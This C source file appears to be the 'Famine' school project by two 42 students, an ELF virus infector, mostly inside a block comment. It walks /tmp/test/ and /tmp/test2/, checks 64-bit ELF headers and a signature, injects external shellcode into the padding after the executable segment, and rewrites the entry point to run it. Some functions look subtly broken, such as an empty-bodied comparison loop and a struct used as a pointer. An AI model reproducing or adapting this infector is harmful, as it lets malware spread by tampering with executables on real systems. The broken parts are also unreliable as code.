/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
/*   Updated: 2022/07/27 22:24:35 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/syscall.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>

#include <stdio.h>

#define BUFF_SZ		1024
#define IDENT		"\x7f" "ELF" "\x2"
#define SIGN		"Famine (42 project) - 2022 - by apitoise & fcadet"
#define SIGN_SZ		49
#define PAGE_SZ		0x1000
#define PAGE_MSK	0xfffffffffffff000

extern uint8_t		sc;
extern uint8_t		sc_end;
extern uint8_t		sc_data;
extern uint8_t		sc_data_end;
extern uint64_t		sc_entry;
extern uint64_t		sc_real_entry;

typedef struct		s_hdrs {
	Elf64_Ehdr		*elf;
	Elf64_Phdr		*txt;
	Elf64_Phdr		*nxt;
}					t_hdrs;

typedef struct		s_sizes {
	uint64_t	mem;
	uint64_t	code;
	uint64_t	data;
	uint64_t	load;
	uint64_t	f_pad;
	uint64_t	m_pad;
}					t_sizes;

typedef struct		s_buffs {
	uint8_t		path[BUFF_SZ];
	uint8_t		zeros[BUFF_SZ];
	uint8_t		entry[BUFF_SZ];
}					t_buffs;

t_hdrs			hdrs = { 0 };
t_sizes			sz = { 0 };
t_buffs			buffs = { 0 };

uint8_t			*mem = NULL;
uint64_t		x_pad = 0;

/*
OK
int		ret_close(int fd, int ret) {
	if (fd >= 0)
		close(fd);
	return (ret);
}

OK
void	get_full_path(char *s1, char *s2, uint8_t *buff) {
	for (; *s1; ++s1, ++buff)
		*buff = *s1;
	for (; *s2; ++s2, ++buff)
		*buff = *s2;
	*buff = '\0';
}

OK
int		str_n_cmp(char *s1, char *s2, int n) {
	for (; *s1 && *s1 == *s2 && --n; ++s1, ++s2)
	return (*s1 - *s2);
}

OK
int64_t			get_fd_size(int fd) {
	int64_t		size;

	if ((size = lseek(fd, 0, SEEK_END)) < 0 || lseek(fd, 0, SEEK_SET) != 0)
		return (-1);
	return (size);
}

OK
int		write_pad(int fd, uint64_t size) {
	uint64_t			write_sz = 0;
	int64_t				w_ret;

	for (; size; size -= write_sz) {
		write_sz = size < BUFF_SZ ? size : BUFF_SZ;
		if ((w_ret = write(fd, buffs.zeros, write_sz)) < 0
				|| (uint64_t)w_ret != write_sz)
			return (-1);
	}
	return (0);
}

OK
static int		map_file(uint8_t *path) {
	int			src;
	int64_t		s_ret;

	if ((src = open((char *)path, O_RDWR)) < 0)
		return (-1);
	if ((s_ret = get_fd_size(src)) < 0
			|| (sz.mem = (uint64_t)s_ret) < sizeof(Elf64_Ehdr)
			|| (mem = mmap(NULL, sz.mem,
					PROT_READ | PROT_WRITE, MAP_PRIVATE, src, 0)) == MAP_FAILED)
		return (ret_close(src, -1));
	return (ret_close(src, 0));
}

OK
static void		write_mem(uint8_t *path) {
	int			dst;
	int64_t		w_ret;
	uint64_t	code_offset;

	if ((dst = open((char *)path, O_WRONLY)) < 0)
		return;
	code_offset = hdrs.txt->p_offset + hdrs.txt->p_filesz - sz.load;
	if ((w_ret = write(dst, mem, code_offset)) < 0 || (uint64_t)w_ret != code_offset
			|| (w_ret = write(dst, &sc, sz.load)) < 0 || (uint64_t)w_ret != sz.load
			|| write_pad(dst, sz.f_pad + x_pad * PAGE_SZ - sz.load)
			|| ((w_ret = write(dst, mem + code_offset + sz.f_pad,
						sz.mem - (code_offset + sz.f_pad))) < 0
				|| (uint64_t)w_ret != sz.mem - (code_offset + sz.f_pad))
			|| write(dst, SIGN, SIGN_SZ) != SIGN_SZ)
	close(dst);
}

OK
static int		test_elf_hdr(void) {
	if (str_n_cmp((char *)hdrs.elf->e_ident, (IDENT), 5)
			|| !(hdrs.elf->e_type == ET_EXEC || hdrs.elf->e_type == ET_DYN)
			|| hdrs.elf->e_machine != EM_X86_64
			|| hdrs.elf->e_shstrndx == SHN_UNDEF
			|| hdrs.elf->e_shstrndx == SHN_XINDEX)
		return (-1);
	return (0);
}

OK
static int		check_infection(void) {
	if (sz.mem < SIGN_SZ)
		return (-1);
	if (!str_n_cmp((char *)(mem + sz.mem - SIGN_SZ), SIGN, SIGN_SZ))
		return (-1);
	return (0);
}

OK
static int		find_txt_seg(void) {
	Elf64_Phdr	*p_hdr;
	uint64_t	i;
	
	hdrs.txt = 0;
	for (i = 0, p_hdr = (Elf64_Phdr *)(mem + hdrs.elf->e_phoff);
			!hdrs.txt && i < hdrs.elf->e_phnum; ++i, ++p_hdr)
		if (p_hdr->p_type == PT_LOAD && (p_hdr->p_flags & PF_X))
			hdrs.txt = p_hdr;
	if (!hdrs.txt || i == hdrs.elf->e_phnum)
		return (-1);
	hdrs.nxt = p_hdr;
	return (0);
}

OK
static int		set_x_pad(void) {
	Elf64_Phdr	*p_hdr;
	Elf64_Shdr	*s_hdr;
	uint64_t	i;

	x_pad = 0;
	if (sz.f_pad < sz.load) {
		if (sz.m_pad >= sz.load) {
			for (i = 0, p_hdr = (Elf64_Phdr *)(mem + hdrs.elf->e_phoff);
					i < hdrs.elf->e_phnum; ++i, ++p_hdr)
				if (p_hdr->p_offset >= hdrs.txt->p_offset + hdrs.txt->p_filesz)
					p_hdr->p_offset += PAGE_SZ;
			for (i = 0, s_hdr = (Elf64_Shdr *)(mem + hdrs.elf->e_shoff);
					i < hdrs.elf->e_shnum; ++i, ++s_hdr)
				if (s_hdr->sh_offset >= hdrs.txt->p_offset + hdrs.txt->p_filesz)
					s_hdr->sh_offset += PAGE_SZ;
			hdrs->elf->e_shoff += PAGE_SZ;
			x_pad = 1;
		} else
			return (-1);
	}
	return (0);
}

OK
static void		update_mem(void) {
	sc_entry = hdrs.txt->p_vaddr + hdrs.txt->p_memsz;
	sc_real_entry = hdrs.elf->e_entry;
	hdrs.elf->e_entry = sc_entry;
	hdrs.txt->p_filesz += sz.load;
	hdrs.txt->p_memsz += sz.load;
}

OK
static void		proc_entries(uint64_t dir_ret, char *root_path) {
	uint16_t		ent_sz;
	uint8_t			*ent_ptr;

	for (ent_ptr = buffs.entry; dir_ret;
			ent_sz = *(uint16_t *)(ent_ptr + 16),
			dir_ret -= ent_sz, ent_ptr += ent_sz) {
		get_full_path(root_path, (char *)(ent_ptr + 18), buffs.path);
		if (map_file(buffs.path) < 0)
			continue;
		hdrs.elf = (Elf64_Ehdr *)mem;
		if (!check_infection() && !test_elf_hdr() && !find_txt_seg()) {
			sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
			sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
			if (!set_x_pad()) {
				update_mem();
				write_mem(buffs.path);
			}
		}
		munmap(mem, sz.mem);
	}
}

OK
static void		proc_dir(char *dir) {
	int				dir_fd;
	int64_t			dir_ret;

	if ((dir_fd = open(dir, O_RDONLY | O_DIRECTORY)) < 0)
		return;
	while ((dir_ret = syscall(SYS_getdents, dir_fd, buffs.entry, BUFF_SZ)) > 0)
		proc_entries(dir_ret, dir);
	close(dir_fd);
}

OK
int		main(void) {
	//bzero glob vars
	
	if (syscall(10, (uint64_t)&sc_data & PAGE_MSK,
			sz.data % PAGE_SZ ? sz.data / PAGE_SZ * PAGE_SZ + PAGE_SZ : sz.data,
			PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
		return (-1);
	
	//set sc_glob

	sz.code = &sc_end - &sc;
	sz.data = &sc_data_end - &sc_data;
	sz.load = sz.data + sz.code;

	proc_dir("/tmp/test/");
	proc_dir("/tmp/test2/");
}
*/
